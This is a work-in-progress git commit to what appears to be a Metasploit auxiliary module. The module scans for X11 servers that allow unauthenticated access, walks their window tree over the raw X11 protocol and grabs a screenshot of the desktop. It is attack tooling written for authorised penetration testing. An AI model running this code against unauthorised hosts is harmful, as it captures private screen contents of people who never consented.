69b89c5d956ff31c784771b3fef7dce695c4ab15
h00die <michaeltcyr@gmail.com>
2024-03-01 15:15:39 -0500

    WIP x11 screenshots and lib

--- modules/auxiliary/scanner/x11/open_x11_screenshot.rb
+++ modules/auxiliary/scanner/x11/open_x11_screenshot.rb
@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'	=> 'X11 No-Auth Screenshot Scanner',
       'Description'	=> %q{
         This module scans for X11 servers that allow anyone
-        to connect without authentication. It can optionally take
+        to connect without authentication and takes
         a screenshot as well.
       },
       'Author'	=> [
@@ -89,18 +89,18 @@ class MetasploitModule < Msf::Auxiliary
     query_extension_calls = 0
 
     # query extension big-requests
-    vprint_status('(2/9) Checking on BIG-REQUESTS extension')
+    vprint_status('(2/15) Checking on BIG-REQUESTS extension')
     sock.put(QUERYEXTENSION.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
     query_extension_calls += 1
     big_requests_plugin = process_extension_query(sock.get_once(-1, 1), 'BIG-REQUESTS')
 
     # enable big requests
-    vprint_status('(3/9) Enabling BIG-REQUESTS')
+    vprint_status('(3/15) Enabling BIG-REQUESTS')
     sock.put(EXTENSIONTOGGLE.new(opcode: big_requests_plugin.major_opcode).to_binary_s) # not sure why we do this
     sock.get_once(-1, 1)
 
     # createGC, GetProperties
-    vprint_status('(4/9) Creating new graphical context')
+    vprint_status('(4/15) Creating new graphical context')
     sock.put(X11CREATEGRAPHICALCONTEXTREQUEST.new(cid: connection.resource_id_base,
                                                   drawable: connection.screen_root,
                                                   gc_value_mask_background: 1).to_binary_s +
@@ -108,39 +108,40 @@ class MetasploitModule < Msf::Auxiliary
     sock.get_once(-1, 1)
 
     # query extension xkeyboard
-    vprint_status('(5/9) Checking on XKEYBOARD extension')
+    vprint_status('(5/15) Checking on XKEYBOARD extension')
     sock.put(QUERYEXTENSION.new(extension: 'XKEYBOARD', unused2: query_extension_calls).to_binary_s) # check if XKEYBOARD exist, not sure why
     xkeyboard_plugin = process_extension_query(sock.get_once(-1, 1), 'XKEYBOARD')
     query_extension_calls += 1
 
     # enable xkeyboard
-    vprint_status('(6/9) Enabling XKEYBOARD')
+    vprint_status('(6/15) Enabling XKEYBOARD')
     sock.put(EXTENSIONTOGGLE.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
     sock.get_once(-1, 1)
 
     # InternAtom wait
-    vprint_status('(7/9) Setting wait on itern atom')
+    vprint_status('(7/15) Setting wait on itern atom')
     sock.put(X11INTERNATOMREQUEST.new(name: 'Wait').to_binary_s)
     sock.get_once(-1, 1)
 
-    vprint_status('(7.5/9) Getting window title atoms')
+    vprint_status('(8/15) Getting window title atoms')
     sock.put(X11INTERNATOMREQUEST.new(name: '_NET_WM_NAME').to_binary_s +
             X11INTERNATOMREQUEST.new(name: "UTF8_STRING\x00").to_binary_s)
     atom_reply = sock.get_once(-1, 1)
-    @window_name_atom = X11INTERNATOMRESPONSE.read(atom_reply[0..atom_reply.length/2])
-    @window_name_atom = @window_name_atom.atom 
-    @window_string_atom = X11INTERNATOMRESPONSE.read(atom_reply[atom_reply.length/2..-1])
-    @window_string_atom = @window_string_atom.atom 
+    @window_name_atom = X11INTERNATOMRESPONSE.read(atom_reply[0..atom_reply.length / 2])
+    @window_name_atom = @window_name_atom.atom
+    @window_string_atom = X11INTERNATOMRESPONSE.read(atom_reply[atom_reply.length / 2..])
+    @window_string_atom = @window_string_atom.atom
     vprint_good("  Using UTF8 windows names via atoms [#{@window_name_atom},#{@window_string_atom}]")
+
     # xkeyboard-bell
-    vprint_status('(8/9) Setting xkeyboard bell')
-    sock.put(BELLREQUEST.new(xkeyboard_id: xkeyboard_plugin.major_opcode).to_binary_s)
+    # XXX this prob needs to be removed, we want the -silent option from xwd
+    # vprint_status('(9/15) Setting xkeyboard bell')
+    # sock.put(BELLREQUEST.new(xkeyboard_id: xkeyboard_plugin.major_opcode).to_binary_s)
     # sock.get_once(-1, 1)
 
     # getwindowattributes+getgeometry
-    # XXX this is getting a response of "Unkonwn request"
     query_extension_calls += 1 # XXX not sure why, figure out where we're missing a call
-    vprint_status('(9/9) Getting root Window Attributes')
+    vprint_status('(10/15) Getting root Window Attributes')
     sock.put(GETREQUEST.new(window: connection.screen_root,
                             opcode: 3, # GetWindowAttributes
                             unused: query_extension_calls).to_binary_s +
@@ -152,23 +153,23 @@ class MetasploitModule < Msf::Auxiliary
     sock.get_once(-1, 1)
 
     # translatecoordinates
-    vprint_status('(10/9) Getting coordinates translation')
+    vprint_status('(11/15) Getting coordinates translation')
     sock.put(TRANSLATECOORDINATESREQUEST.new(src_window: connection.screen_root, dst_window: connection.screen_root).to_binary_s)
     sock.get_once(-1, 1)
 
     # getproperty
-    vprint_status('(11/9) ')
+    vprint_status('(12/15) Getting propties of root window')
     sock.put(X11GETPROPERTYREQUEST.new(window: connection.screen_root).to_binary_s)
     sock.get_once(-1, 1)
 
     # InternAtom server_overlay_visuals
-    vprint_status('(12/9) Setting Server Overlay Visuals on Itern Atom')
+    vprint_status('(13/15) Setting Server Overlay Visuals on Itern Atom')
     sock.put(X11INTERNATOMREQUEST.new(name: "SERVER_OVERLAY_VISUALS\x00\x00",
                                       only_if_exists: 1).to_binary_s)
     sock.get_once(-1, 1)
 
     # getwindowattributes+getgeometry
-    vprint_status('(13/9) Getting window attributes and geometry')
+    vprint_status('(14/15) Getting window attributes and geometry')
     sock.put(GETREQUEST.new(window: connection.screen_root,
                             opcode: 3,
                             unused: 3).to_binary_s +
@@ -177,51 +178,67 @@ class MetasploitModule < Msf::Auxiliary
     sock.get_once(-1, 1)
 
     # querytree
-    vprint_status('(14/9) Getting Tree')
-    tree = get_process_tree(connection.screen_root,'')
-    puts "and now were done, heres the final tree"
-    puts tree
+    vprint_status('(15/15) Getting Tree')
+    # @all_windows keeps track of all windows which are bigger than 1x1, aka visible windows.
+    @all_windows = []
+    get_process_tree(connection.screen_root, '')
+    puts @all_windows.inspect
+    # determine the background image, it will have x/y offsets of 0, and the heigh/width will match the root
+    # we go in reverse because we want the top most layer that satisfies these requirements
+    @all_windows.reverse.each do |window|
+      next unless window['x'] == 0 &&
+                  window['y'] == 0 &&
+                  window['height'] == connection.screen_height_in_pixels &&
+                  window['width'] == connection.screen_width_in_pixels
+
+      print_good("Found background image: #{window['window_id']} (#{window['window_int']})")
+      sock.put(GETIMAGEREQUEST.new(height: window['height'],
+                                   width: window['width'],
+                                   drawable: window['window_int']).to_binary_s)
+      GETIMAGERESPONSE.read(sock.get_once(-1, 1))
+
+      break
+    end
+
+    # cleanup
+    vprint_status('Performing cleanup')
+    sock.put(X11GETINPUTFOCUSREQUEST.new.to_binary_s)
+    sock.put(X11FREEGRAPHICALCONTEXTREQUEST.new(gc: connection.resource_id_base).to_binary_s +
+              X11GETINPUTFOCUSREQUEST.new.to_binary_s)
   end
 
   def get_process_tree(window, spaces)
-    vprint_status("#{spaces}  Getting children for window #{window}")
-    tree = {}
+    vprint_status("#{spaces}  Getting children for window 0x#{window.to_i.to_s(16)}")
     sock.put(QUERYTREEREQUEST.new(drawable: window).to_binary_s)
 
     response = sock.get_once(-1, 1)
-    attempts_to_read_data = 0
+    attempts_to_read_data = 1
     trees = nil
     while attempts_to_read_data < 3 && trees.nil?
       begin
         trees = QUERYTREERESPONSE.read(response)
-      rescue StandardError => e
+        break
+      rescue StandardError
         vprint_bad("Failed to parse data, attempt #{attempts_to_read_data}/3 to get more")
       end
-      tmp_data  = sock.get_once(-1, 1)
+      tmp_data = sock.get_once(-1, 1)
       response << tmp_data unless tmp_data.nil?
-      attempts_to_read_data +=1
+      attempts_to_read_data += 1
     end
-    vprint_status("  #{spaces}Found #{trees.children.length} child windows")
-
-    # getwindowattributes+getgeometry
-    # vprint_status('(15/9) Getting window attributes and geometry for each tree')
-    #puts trees.inspect
-    trees.children.each_with_index do |child_window, i|
-      #next if t == connection.screen_root # no need to hit the root
-      next if child_window < 5_000 # arbitrary value i'm seeing, most invalid windows are like 0-1500, however valid ones are in the millions
-      #puts "Attemping to get data for child_window: #{child_window}"
+    vprint_status("  #{spaces}Found #{trees.children.length} child windows") if !trees.children.empty?
+    trees.children.sort.each_with_index do |child_window, i|
       # getwindowattributes+getgeometry
       sock.put(GETREQUEST.new(window: child_window,
                               opcode: 3,
                               unused: 3).to_binary_s +
               GETREQUEST.new(window: child_window,
-                opcode: 14).to_binary_s +
+                             opcode: 14).to_binary_s +
               X11GETPROPERTYREQUEST.new(window: child_window,
-                property: @window_name_atom,
-                get_property_type: @window_string_atom).to_binary_s)
+                                        property: @window_name_atom,
+                                        get_property_type: @window_string_atom).to_binary_s)
 
       response = sock.get_once(-1, 1)
-      attempts_to_read_data = 0
+      attempts_to_read_data = 1
       window_attributes = nil
       window_geometry = nil
       window_name = nil
@@ -229,40 +246,44 @@ class MetasploitModule < Msf::Auxiliary
         begin
           window_attributes = GETWINDOWRESPONSE.read(response[0..44])
           window_geometry = WINDOWATTRIBUTESGETGEOMETRYRESPONSE.read(response[44..76])
-          window_name = X11GETPROPERTYRESPONSE.read(response[76..-1])
+          window_name = X11GETPROPERTYRESPONSE.read(response[76..])
+          break
         rescue StandardError
           vprint_bad("Failed to parse data, attempt #{attempts_to_read_data}/3 to get more")
         end
-        tmp_data  = sock.get_once(-1, 1)
+        tmp_data = sock.get_once(-1, 1)
         response << tmp_data unless tmp_data.nil?
-        attempts_to_read_data +=1
+        attempts_to_read_data += 1
       end
 
       if window_attributes.nil? || window_geometry.nil? || window_name.nil?
-        print_bad("Error reading data")
+        print_bad('Error reading data')
       end
-    
 
-      # if window_geometry.width == connection.screen_width_in_pixels && window_geometry.height == connection.screen_height_in_pixels
-      # if t.to_i.to_s(16) == '2800003' || t.to_i.to_s(16) == '260000a' || t.to_i.to_s(16) == '406913' || t.to_i.to_s(16) == '407896'
-      if window_attributes.your_event_mask == 0 || window_attributes.your_event_mask == 256 || window_attributes.your_event_mask == 65536
-        vprint_status("#{spaces}#{i}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y}")
+      if window_geometry.width > 1 && window_geometry.height > 1
+        @all_windows.append({
+          'window_id' => "0x#{child_window.to_i.to_s(16)}",
+          'window_int' => child_window,
+          'height' => window_geometry.height,
+          'width' => window_geometry.width,
+          'x' => window_geometry.x,
+          'y' => window_geometry.y
+        })
+      end
+
+      if window_attributes.your_event_mask == 0 || window_attributes.your_event_mask == 65536
+        vprint_status("#{spaces}#{i + 1}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y} event_mask: #{window_attributes.your_event_mask}")
       else
-        print_good("#{spaces}#{i}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y}")
-        #puts "  #{spaces}#{window_attributes.inspect}"
-        #puts "  #{spaces}#{window_geometry.inspect}"
-        next if child_window == window # dont recurse yourself
-        tree[child_window.to_i] = get_process_tree(child_window, "  #{spaces}")
-        #puts tree.inspect
+        print_good("#{spaces}#{i + 1}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y} event_mask: #{window_attributes.your_event_mask}")
+        get_process_tree(child_window, "  #{spaces}")
       end
     end
-    tree
   end
 
   def run_host(ip)
     vprint_status('Establishing TCP Connection')
     connect # tcp connection establish
-    vprint_status('(1/9) Establishing X11 connection')
+    vprint_status('(1/15) Establishing X11 connection')
     sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish
     packet = sock.get_once(-1, 1)
     begin
@@ -281,7 +302,7 @@ class MetasploitModule < Msf::Auxiliary
 
     if connection.success == 1
       print_good("#{ip} - Successly established X11 connection")
-      #puts connection.inspect
+      # puts connection.inspect
       vprint_status("  Vendor: #{connection.vendor}")
       vprint_status("  Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
       vprint_status("  Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
